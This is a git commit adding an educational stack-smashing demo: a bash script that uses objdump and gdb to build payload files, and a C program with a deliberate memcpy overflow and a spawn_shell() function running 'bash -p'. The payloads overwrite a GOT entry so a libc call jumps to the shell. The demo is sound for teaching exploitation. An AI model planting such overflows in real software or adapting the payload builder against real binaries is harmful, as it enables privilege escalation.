79537483314aa9bf3f44744456a6f255901bb89f
soniloi <niloinso@tcd.ie>
2015-03-26 14:19:11 +0000

    Added files to demonstrate a minimal stack-smashing attack in action

---
+++ smash-demo/user-copy/calculate_payloads.sh
@@ -0,0 +1,61 @@
+#!/bin/bash
+
+# Construct payloads
+
+usage="Usage: $0 <executable> <library-fn-name> <item-buffer-bound>"
+grepnc="grep --color=never"
+
+# Check number of parameters
+#if [[ "$#" -ne 3 ]]; then
+#        echo $usage
+#        exit 1
+#fi
+
+binname=$1
+libfn="_IO_putc"
+bufbound=47
+execfn="execl"
+spawnfn="spawn_shell"
+
+bindir=`dirname $binname`
+dat1="$bindir/data1.dat"
+dat2="$bindir/data2.dat"
+
+# Find address of libc library function to be overwritten
+libaddrline=(`objdump --dynamic-reloc $binname | $grepnc $libfn`)
+echo "Address of $libfn@got.plt: 0x$libaddrline"
+
+# Find address of execl
+execaddrline=(`objdump --dynamic-reloc $binname | $grepnc $execfn`)
+distance=$((0x$execaddrline - 0x$libaddrline))
+echo "Offset to $execfn@got.plt: $distance"
+let distance=$(($distance / 8))
+
+# Find table entry of execl
+execloc=(`gdb $binname -ex "x/2gx 0x$execaddrline" -ex "quit" | $grepnc "<$execfn@got\.plt>"`)
+execloc=(`echo ${execloc[2]} | cut -f2 -d "x"`)
+echo "Location of $execfn@got.plt: 0x$execloc"
+
+# Find address of shell-spawning function
+spawnaddrline=(`gdb $binname -ex "p $spawnfn" -ex "quit" | $grepnc "0x[0-9a-fA-F]\{6,8\}"`)
+salindex=0
+for i in "${!spawnaddrline[@]}"; do
+	if [[ ${spawnaddrline[$i]} == "<$spawnfn>" ]]; then
+		let salindex="$i-1"
+	fi
+done
+spawnaddr=(`echo ${spawnaddrline[$salindex]} | tr 'x' '0'`)
+echo "Address of spawn_shell(): $spawnaddr"
+
+# Write first payload file
+if [ -f $dat1 ]; then rm $dat1; fi
+for i in $(seq 0 "$bufbound"); do echo -n -e \\x41 >> $dat1; done
+for ((i=7;i>=0;i--)); do echo -n -e \\x${libaddrline:2*i:2} >> $dat1; done
+
+# Write second payload file
+if [ -f $dat2 ]; then rm $dat2; fi
+for ((i=3;i>=0;i--)); do echo -n -e \\x${spawnaddr:2*i:2} >> $dat2; done
+for i in {0..3}; do echo -n -e \\x00 >> $dat2; done
+for i in $(seq 1 "$distance"); do
+	for ((i=7;i>=0;i--)); do echo -n -e \\x${execloc:2*i:2} >> $dat2; done
+done;
---
+++ smash-demo/user-copy/eggshell.c
@@ -0,0 +1,47 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#define SIZE_MAX 48 // Maximum size of item's data buffer
+#define SIZE_BUFFER 64 // Maximum size of the string buffer to be entered
+
+struct item{
+	char data[SIZE_MAX];
+	struct item * next;
+};
+
+void spawn_shell(){
+	execl("/bin/bash", "/bin/bash", "-p", NULL);
+}
+
+int main(int argc, char ** argv){
+	char * filename1 = argv[1];
+	char * filename2 = argv[2];
+
+	FILE * file;
+	char buffer1[SIZE_BUFFER], buffer2[SIZE_BUFFER];
+
+	file = fopen(filename1, "r");
+	if(file){
+		fread(buffer1, 1, SIZE_BUFFER, file);
+		fclose(file);
+	}
+
+	file = fopen(filename2, "r");
+	if(file){
+		fread(buffer2, 1, SIZE_BUFFER, file);
+		fclose(file);
+	}
+
+	struct item item1, item2;
+	item1.next = &item2;
+	item2.next = &item1;
+
+	memcpy(item1.data, buffer1, SIZE_BUFFER); // Potential for overflow!!
+	memcpy(item1.next, buffer2, SIZE_MAX); // This is the correct size
+
+	_IO_putc('*', stdout);
+}
+
+
